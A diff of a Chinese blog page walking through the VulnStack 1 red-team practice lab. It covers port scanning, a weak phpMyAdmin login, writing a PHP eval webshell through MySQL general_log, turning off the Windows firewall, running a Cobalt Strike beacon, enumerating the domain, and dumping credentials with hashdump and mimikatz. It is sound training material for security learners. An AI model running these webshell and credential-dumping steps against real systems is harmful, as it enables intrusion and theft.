@@ -911,14 +911,16 @@
 <p>红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。另外本次实战完全模拟 ATT&amp;CK 攻击链路进行搭建，开成完整闭环。后续也会搭建真实 APT 实战环境，从实战中成长。虚拟机所有统一密码：hongrisec@2019</p>
 </blockquote>
 <p>靶机下载地址：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/"><strong>ATT&amp;CK红队评估实战靶场</strong></a></p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><table>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><div class="table-container">
+<table>
 <thead>
 <tr>
 <th>网络拓扑结构</th>
 <th><img src="https://img.jwt1399.top//img/20200803112138.png" alt="网络拓扑图"></th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr>
 <td><strong>VMware 网络配置</strong></td>
 <td><img src="../images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%EF%BC%9AVulnStack1/20200803123245.png" alt="VMware 网络配置"></td>
 </tr>
@@ -930,7 +932,9 @@
 <td><strong>实际配置图</strong></td>
 <td><img src="https://img.jwt1399.top//img/20200803123239.jpg" alt="实际配置图"></td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
+</div>
 <p>模拟外网：Vmnet1（192.168.52.0/24）</p>
 <p>模拟内网：VMnet2（192.168.57.0/24）</p>
 <ul>
@@ -946,39 +950,37 @@
 <li>主机名：stu1</li>
 </ul>
 </li>
-<li><p>域成员主机：Windows Server 2003</p>
-<ul>
+<li>域成员主机：Windows Server 2003<ul>
 <li>IP：192.168.72.141       </li>
 <li>主机名：root-tvi862ubeh</li>
 </ul>
 </li>
-<li><p>域控服务器：Windows Server 2008</p>
-<ul>
+<li>域控服务器：Windows Server 2008<ul>
 <li>IP：192.168.72.138</li>
 <li>主机名：owa             </li>
 </ul>
 </li>
 </ul>
 <p><strong>启动Web环境：打开Win7后，打开PhpStudy</strong></p>
-<h2 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="1-探测主机"><a href="#1-探测主机" class="headerlink" title="1.探测主机"></a>1.探测主机</h4><pre class="line-numbers language-bash"><code class="language-bash">netdiscover -i eth0 -r 192.168.52.0/24
+<h2 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="1-探测主机"><a href="#1-探测主机" class="headerlink" title="1.探测主机"></a>1.探测主机</h4><pre class="line-numbers language-lang-bash"><code class="language-lang-bash">netdiscover -i eth0 -r 192.168.52.0/24
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://img.jwt1399.top//img/20200804102558.png"></p>
-<h4 id="2-查看目标主机开放端口"><a href="#2-查看目标主机开放端口" class="headerlink" title="2.查看目标主机开放端口"></a>2.查看目标主机开放端口</h4><pre class="line-numbers language-bash"><code class="language-bash">nmap -sV -p- 192.168.52.143
+<p><img src="https://img.jwt1399.top//img/20200804102558.png" alt=""></p>
+<h4 id="2-查看目标主机开放端口"><a href="#2-查看目标主机开放端口" class="headerlink" title="2.查看目标主机开放端口"></a>2.查看目标主机开放端口</h4><pre class="line-numbers language-lang-bash"><code class="language-lang-bash">nmap -sV -p- 192.168.52.143
 
 -sV 用来扫描目标主机和端口上运行的软件的版本
 -p- 扫描0-65535全部端口
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://img.jwt1399.top//img/20200804102548.png"></p>
+<p><img src="https://img.jwt1399.top//img/20200804102548.png" alt=""></p>
 <p>开放了80和3306端口，说明存在Web服务</p>
 <h4 id="3-查看网页收集相关信息"><a href="#3-查看网页收集相关信息" class="headerlink" title="3.查看网页收集相关信息"></a>3.查看网页收集相关信息</h4><p><strong>1.访问web页面，获取到phpMyadmin登录密码</strong></p>
 <p>访问Web服务是一个 <code>phpStudy</code> 探针页面，在这里可以获取到网站的绝对路径 <code>C:/phpStudy/www/</code></p>
 <p>最下面 <code>MYSQL</code> 数据库连接检测：输入弱密码 <code>root/root</code> 成功连接</p>
 <p>或者使用phpMyadmin爆破工具也能得到用户名密码</p>
-<p><img src="https://img.jwt1399.top//img/20200804113505.png"></p>
+<p><img src="https://img.jwt1399.top//img/20200804113505.png" alt=""></p>
 <p><strong>2.扫描目录，获取到网站后台路径和登录用户和密码</strong></p>
-<p><img src="https://img.jwt1399.top//img/20200804112911.png"></p>
+<p><img src="https://img.jwt1399.top//img/20200804112911.png" alt=""></p>
 <p>扫描到数据库后台 <code>PhpMyadmin</code> 和备份文件 <code>beifen.rar</code>，下载解压得到 <code>yxcms</code> 文件夹，是一个网站的源码，直接访问<code>http://192.168.52.143/yxcms</code>，发现了网站有后台路径和管理员账户泄露</p>
-<p><img src="https://img.jwt1399.top//img/20200804114529.png"></p>
+<p><img src="https://img.jwt1399.top//img/20200804114529.png" alt=""></p>
 <h3 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h3><h4 id="1-phpMyadmin日志Getshell"><a href="#1-phpMyadmin日志Getshell" class="headerlink" title="1.phpMyadmin日志Getshell"></a>1.phpMyadmin日志Getshell</h4><p>前面信息收集第一步获得的phpMyadmin的用户名和密码，登录进去想办法获得shell</p>
 <p><strong>phpmyadmin后台getshell一般有以下几种方式：</strong></p>
 <ul>
@@ -989,33 +991,33 @@
 <li>5、利用phpmyadmin4.8.x本地文件包含漏洞getshell</li>
 </ul>
 <p>看看第一种是否可以，先查看是否有写权限：</p>
-<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">show</span> <span class="token keyword">global</span> variables <span class="token operator">like</span> <span class="token string">'%secure_file%'</span><span class="token punctuation">;</span>
+<pre class="line-numbers language-lang-sql"><code class="language-lang-sql">show global variables like '%secure_file%';
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://img.jwt1399.top//img/20200804155311.png"></p>
+<p><img src="https://img.jwt1399.top//img/20200804155311.png" alt=""></p>
 <p><code>secure_file_priv</code> 值为 <code>NULL</code>，不能使用 <code>into outfile</code> 方式写入 shell</p>
 <p>再来看一下第二种，利用全局变量<code>general_log</code>来Getshell</p>
 <p><strong>1.查看全局日志状态</strong></p>
-<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">show</span> variables  <span class="token operator">like</span>  <span class="token string">'%general%'</span><span class="token punctuation">;</span> 
+<pre class="line-numbers language-lang-sql"><code class="language-lang-sql">show variables  like  '%general%';
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://img.jwt1399.top//img/20200804153700.png"></p>
+<p><img src="https://img.jwt1399.top//img/20200804153700.png" alt=""></p>
 <p><strong>2.开启日志,将所有查询语句记录到新指定的可访问的文件中</strong></p>
-<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">set</span> <span class="token keyword">global</span> general_log<span class="token operator">=</span><span class="token keyword">on</span><span class="token punctuation">;</span>
+<pre class="line-numbers language-lang-sql"><code class="language-lang-sql">set global general_log=on;
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><strong>3.设置全局日志的路径为网站目录</strong></p>
-<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">set</span> <span class="token keyword">global</span> general_log_file <span class="token operator">=</span> <span class="token string">'C:/phpStudy/WWW/jwt.php'</span>
+<pre class="line-numbers language-lang-sql"><code class="language-lang-sql">set global general_log_file = 'C:/phpStudy/WWW/jwt.php'
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://img.jwt1399.top//img/20200804155305.png" alt="修改后全局日志状态"></p>
 <p><strong>4.将一句话木马写入该日志文件</strong></p>
-<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token string">'&lt;?php eval($_POST["cmd"]);?>'</span> 
+<pre class="line-numbers language-lang-sql"><code class="language-lang-sql">SELECT '<?php eval($_POST["cmd"]);?>'
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://img.jwt1399.top//img/20200804154525.png"></p>
+<p><img src="https://img.jwt1399.top//img/20200804154525.png" alt=""></p>
 <p>成功连接蚁剑</p>
-<p><img src="https://img.jwt1399.top//img/20200804155258.png"></p>
+<p><img src="https://img.jwt1399.top//img/20200804155258.png" alt=""></p>
 <h4 id="2-后台修改前台模板Getshell"><a href="#2-后台修改前台模板Getshell" class="headerlink" title="2.后台修改前台模板Getshell"></a>2.后台修改前台模板Getshell</h4><p>根据信息收集第三步中获得的后台路径<code>/index.php?r=admin</code>和用户名:admin;密码:123456</p>
 <p>登录进后台，然后发现前台模板有php文件编辑，可以直接写一句话木马进去获取shell</p>
-<p><img src="https://img.jwt1399.top//img/20200804151401.png"></p>
+<p><img src="https://img.jwt1399.top//img/20200804151401.png" alt=""></p>
 <p>在刚才解压的文件夹下找到info.php的路径（<code>/yxcms/protected/apps/default/view/default/info.php</code>）或者利用目录遍历找到路径，直接蚁剑连接</p>
-<p><img src="https://img.jwt1399.top//img/20200804151358.png"></p>
+<p><img src="https://img.jwt1399.top//img/20200804151358.png" alt=""></p>
 <p> <strong>参考：</strong></p>
 <ul>
 <li><p><a target="_blank" rel="noopener" href="https://soapffz.com/sec/496.html">phpmyadmin 后台 getshell 及漏洞利用</a></p>
@@ -1025,20 +1027,21 @@
 </ul>
 <h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="反弹shell给Cobalt-Strike"><a href="#反弹shell给Cobalt-Strike" class="headerlink" title="反弹shell给Cobalt Strike"></a>反弹shell给Cobalt Strike</h3><p><strong>1.CS创建Listener</strong></p>
 <p>通过 <code>Cobalt Stike</code> → <code>Listeners</code> → <code>Add</code> 创建一个监听器</p>
-<p><img src="https://img.jwt1399.top//img/20200804163614.png"></p>
+<p><img src="https://img.jwt1399.top//img/20200804163614.png" alt=""></p>
 <p><strong>2.生成后门文件</strong></p>
 <p><code>攻击</code>→<code>生成后门</code> → <code>Windows Executable(S)</code>，监听器选择刚创建的 <code>Listener</code>，输出选择<code>Windows EXE</code></p>
-<p><img src="../images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%EF%BC%9AVulnStack1/image-20200804165256799.png"></p>
+<p><img src="../images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%EF%BC%9AVulnStack1/image-20200804165256799.png" alt=""></p>
 <p><strong>3.蚁剑上传后门</strong></p>
 <p>先关闭受害机防火墙</p>
-<pre class="line-numbers language-bash"><code class="language-bash">netsh advfirewall <span class="token keyword">set</span> allprofiles state off
+<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">netsh advfirewall set allprofiles state off
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://img.jwt1399.top//img/20200804170220.png"></p>
+<p><img src="https://img.jwt1399.top//img/20200804170220.png" alt=""></p>
 <p>再上传生成的exe</p>
-<p><img src="https://img.jwt1399.top//img/20200804170222.png"></p>
+<p><img src="https://img.jwt1399.top//img/20200804170222.png" alt=""></p>
 <p><strong>4.执行exe获得shell</strong><br>直接输入exe 文件名执行 exe</p>
-<p><img src="https://img.jwt1399.top//img/20200804170206.png"></p>
+<p><img src="https://img.jwt1399.top//img/20200804170206.png" alt=""></p>
 <p>获得Cobalt Strike 的 shell</p>
+<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -1046,55 +1049,58 @@
 <th>主机上线</th>
 </tr>
 </thead>
-<tbody><tr>
-<td><img src="https://img.jwt1399.top//img/20200804170514.png"></td>
-<td><img src="https://img.jwt1399.top//img/20200804171118.png"></td>
+<tbody>
+<tr>
+<td><img src="https://img.jwt1399.top//img/20200804170514.png" alt=""></td>
+<td><img src="https://img.jwt1399.top//img/20200804171118.png" alt=""></td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
+</div>
 <p>拿到 <code>shell</code> 第一步，调低心跳值，默认心跳为 <code>60s</code>，执行命令的响应很慢，进入 <code>beacon</code> 执行 <code>sleep 5</code> 或者右键主机选择 <code>会话</code> →<code>Sleep</code>进行设置</p>
-<p><img src="https://img.jwt1399.top//img/20200804172330.png"></p>
+<p><img src="https://img.jwt1399.top//img/20200804172330.png" alt=""></p>
 <h3 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h3><p>右键受害机选择<code>进入 beacon</code> 执行命令（执行cmd命令前面要加shell）</p>
 <p><strong>查询基本信息</strong></p>
-<pre class="line-numbers language-bash"><code class="language-bash">shell <span class="token function">whoami</span>
-shell <span class="token function">hostname</span>
-net user     <span class="token comment" spellcheck="true"># 本机用户列表</span>
-net localgroup administrators    <span class="token comment" spellcheck="true"># 本机管理员[通常含有域用户]</span>
-shell systeminfo <span class="token comment" spellcheck="true">#查看系统详细信息</span>
-<span class="token function">nslookup</span> god.org    <span class="token comment" spellcheck="true"># 解析域名IP地址</span>
+<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">shell whoami
+shell hostname
+net user     # 本机用户列表
+net localgroup administrators    # 本机管理员[通常含有域用户]
+shell systeminfo #查看系统详细信息
+nslookup god.org    # 解析域名IP地址
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://img.jwt1399.top//img/20200804173824.png"></p>
+<p><img src="https://img.jwt1399.top//img/20200804173824.png" alt=""></p>
 <p><strong>查询操作系统信息</strong></p>
-<pre class="line-numbers language-bash"><code class="language-bash">shell systeminfo <span class="token operator">|</span> findstr /B /C:<span class="token string">"OS Name"</span> /C:<span class="token string">"OS Version"</span>  <span class="token comment" spellcheck="true"># 英文操作系统</span>
-shell systeminfo <span class="token operator">|</span> findstr /B /C:<span class="token string">"OS 名称"</span> /C:<span class="token string">"OS 版本"</span>   <span class="token comment" spellcheck="true"># 中文操作系统</span>
-shell <span class="token keyword">echo</span> %PROCESSOR_ARCHITECTURE%    <span class="token comment" spellcheck="true"># 查看系统系统结构</span>
+<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">shell systeminfo | findstr /B /C:"OS Name" /C:"OS Version"  # 英文操作系统
+shell systeminfo | findstr /B /C:"OS 名称" /C:"OS 版本"   # 中文操作系统
+shell echo %PROCESSOR_ARCHITECTURE%    # 查看系统系统结构
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p><strong>查询已安装的软件以及版本信息</strong></p>
-<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 使用wmic操作</span>
+<pre class="line-numbers language-lang-bash"><code class="language-lang-bash"># 使用wmic操作
 shell wmic product get name,version 
 
-<span class="token comment" spellcheck="true">#使用powershell进行操作</span>
-powershell <span class="token string">"Get-WmiObject -class Win32_Product | Select-Object -Property name,Version"</span> 
+#使用powershell进行操作
+powershell "Get-WmiObject -class Win32_Product | Select-Object -Property name,Version"
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>查询进程及服务</strong></p>
-<pre class="line-numbers language-bash"><code class="language-bash">shell tasklist <span class="token comment" spellcheck="true"># 默认显示映像名称，PID，会话名，会话，内存使用</span>
-shell tasklist /svc <span class="token comment" spellcheck="true"># 默认显示映像名称，PID，服务</span>
-shell wmic process list brief <span class="token comment" spellcheck="true"># 列出进程的核心信息,类似任务管理器</span>
-net statistics workstation     <span class="token comment" spellcheck="true"># 查看主机开机时间</span>
-<span class="token function">netstat</span> -ano    <span class="token comment" spellcheck="true">#查询端口列表</span>
-wmic qfe get caption,description,hotfixid,installedon   <span class="token comment" spellcheck="true">#查询本机安装的补丁</span>
+<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">shell tasklist # 默认显示映像名称，PID，会话名，会话，内存使用
+shell tasklist /svc # 默认显示映像名称，PID，服务
+shell wmic process list brief # 列出进程的核心信息,类似任务管理器
+net statistics workstation     # 查看主机开机时间
+netstat -ano    #查询端口列表
+wmic qfe get caption,description,hotfixid,installedon   #查询本机安装的补丁
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h3><h4 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h4><pre class="line-numbers language-bash"><code class="language-bash">shell ipconfig /all    <span class="token comment" spellcheck="true"># 查询本机IP段，所在域等</span>
-shell net user /domain    <span class="token comment" spellcheck="true"># 查询域用户</span>
-shell net view             <span class="token comment" spellcheck="true"># 查看域信息</span>
-shell net view /domain   <span class="token comment" spellcheck="true"># 查看主域信息</span>
-shell net <span class="token function">time</span> /domain  <span class="token comment" spellcheck="true"># 获取域服务器的时间</span>
-shell net group <span class="token string">"domain computers"</span> /domain         <span class="token comment" spellcheck="true">#查看域内所有的主机名</span>
-shell net group <span class="token string">"domain admins"</span>   /domain          <span class="token comment" spellcheck="true">#查看域管理员</span>
-shell net group <span class="token string">"domain controllers"</span> /domain       <span class="token comment" spellcheck="true">#查看域控</span>
-shell net config workstation  <span class="token comment" spellcheck="true"># 查询当前登陆域及当前计算机名，全名，用户名，系统版本，工作站域</span>
+<h3 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h3><h4 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h4><pre class="line-numbers language-lang-bash"><code class="language-lang-bash">shell ipconfig /all    # 查询本机IP段，所在域等
+shell net user /domain    # 查询域用户
+shell net view             # 查看域信息
+shell net view /domain   # 查看主域信息
+shell net time /domain  # 获取域服务器的时间
+shell net group "domain computers" /domain         #查看域内所有的主机名
+shell net group "domain admins"   /domain          #查看域管理员
+shell net group "domain controllers" /domain       #查看域控
+shell net config workstation  # 查询当前登陆域及当前计算机名，全名，用户名，系统版本，工作站域
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h4 id="判断是否存在域控"><a href="#判断是否存在域控" class="headerlink" title="判断是否存在域控"></a>判断是否存在域控</h4><p>使用 <code>shell ipconfig /all</code> 查看 <code>DNS</code> 服务器，发现 DNS 服务器名为 <code>god.org</code></p>
-<p><img src="../images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%EF%BC%9AVulnStack1/image-20200805161038207.png"></p>
+<p><img src="../images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%EF%BC%9AVulnStack1/image-20200805161038207.png" alt=""></p>
 <p>从域信息收集可以得到以下信息：</p>
 <ul>
 <li>域：god.org</li>
@@ -1106,18 +1112,18 @@ shell net config workstation  <span class="token comment" spellcheck="true"># �
 <h2 id="横向探测"><a href="#横向探测" class="headerlink" title="横向探测"></a>横向探测</h2><h4 id="凭据导出"><a href="#凭据导出" class="headerlink" title="凭据导出"></a>凭据导出</h4><blockquote>
 <p>凭据可以理解为目标机的账号，密码。凭据导出是渗透测试中极为重要的步骤，导出目标机凭据后，我们可以使用凭据实现横向移动（利用hash传递，smb/rdp爆破等等手法）来扩大我们的战果。</p>
 </blockquote>
-<h5 id="hashdump读内存密码"><a href="#hashdump读内存密码" class="headerlink" title="hashdump读内存密码"></a>hashdump读内存密码</h5><pre class="line-numbers language-bash"><code class="language-bash">beacon<span class="token operator">></span> hashdump
+<h5 id="hashdump读内存密码"><a href="#hashdump读内存密码" class="headerlink" title="hashdump读内存密码"></a>hashdump读内存密码</h5><pre class="line-numbers language-lang-bash"><code class="language-lang-bash">beacon> hashdump
 或者
 右键点击beacon会话→执行→转储Hash
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h5 id="Mimikatz导出凭据"><a href="#Mimikatz导出凭据" class="headerlink" title="Mimikatz导出凭据"></a><strong>Mimikatz导出凭据</strong></h5><p>利用 <code>mimitakz</code> 模块（实战中需要免杀处理），读注册表密码</p>
-<pre class="line-numbers language-bash"><code class="language-bash">beacon<span class="token operator">></span> logonpasswords
+<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">beacon> logonpasswords
 或者
 右键点击主机→执行→Run Mimikatz
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://img.jwt1399.top//img/20200804182058.png"></p>
+<p><img src="https://img.jwt1399.top//img/20200804182058.png" alt=""></p>
 <h5 id="凭据存储"><a href="#凭据存储" class="headerlink" title="凭据存储"></a><strong>凭据存储</strong></h5><p>点击<code>凭证信息</code>可以查看读取到的密码</p>
-<p><img src="https://img.jwt1399.top//img/20200804182054.png"></p>
+<p><img src="https://img.jwt1399.top//img/20200804182054.png" alt=""></p>
 <h2 id="环境崩了，后续操作暂时无法更新"><a href="#环境崩了，后续操作暂时无法更新" class="headerlink" title="环境崩了，后续操作暂时无法更新"></a>环境崩了，后续操作暂时无法更新</h2><p><strong>参考：</strong></p>
 <ul>
 <li><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/231111.html">ATT&amp;CK实战 | Vulnstack 红队（一）</a></p>
@@ -1126,14 +1132,10 @@ shell net config workstation  <span class="token comment" spellcheck="true"># �
 </li>
 <li><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1633420">内网渗透靶机-VulnStack 1</a></p>
 </li>
-<li><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/189940#h2-0">从外网到域控（vulnstack靶机实战）</a></p>
-</li>
-<li><p><a href="%5Bhttps://www.iambigboss.top/post/54200_1_1.html#%E6%B4%BE%E7%94%9FCobaltStrike%E6%9D%83%E9%99%90%5D(https://www.iambigboss.top/post/54200_1_1.html#%E6%B4%BE%E7%94%9FCobaltStrike%E6%9D%83%E9%99%90)"><a target="_blank" rel="noopener" href="https://www.iambigboss.top/post/54200_1_1.html">内网渗透实战技巧</a></a></p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/aXEJpZVxxSkFUfG8TqsxHw">内网渗透学习导航</a></p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://www.t00ls.net/articles-39285.html">内网渗透命令大全</a></p>
-</li>
+<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/189940#h2-0">从外网到域控（vulnstack靶机实战）</a></li>
+<li><a href="[https://www.iambigboss.top/post/54200_1_1.html#%E6%B4%BE%E7%94%9FCobaltStrike%E6%9D%83%E9%99%90](https://www.iambigboss.top/post/54200_1_1.html#派生CobaltStrike权限"><a target="_blank" rel="noopener" href="https://www.iambigboss.top/post/54200_1_1.html">内网渗透实战技巧</a></a>)</li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/aXEJpZVxxSkFUfG8TqsxHw">内网渗透学习导航</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.t00ls.net/articles-39285.html">内网渗透命令大全</a></li>
 </ul>
 <h2 id="赞助💰"><a href="#赞助💰" class="headerlink" title="赞助💰"></a>赞助💰</h2><p>如果你觉得对你有帮助，你可以请我喝一杯冰可乐！嘻嘻🤭</p>
 <table>
@@ -1925,7 +1927,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">1067.4k</span>&nbsp;字
+                class="white-color">712.3k</span>&nbsp;字
             
             
             
@@ -2156,6 +2158,22 @@ $(function () {
     
 
         
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
 </body>
 
 </html>
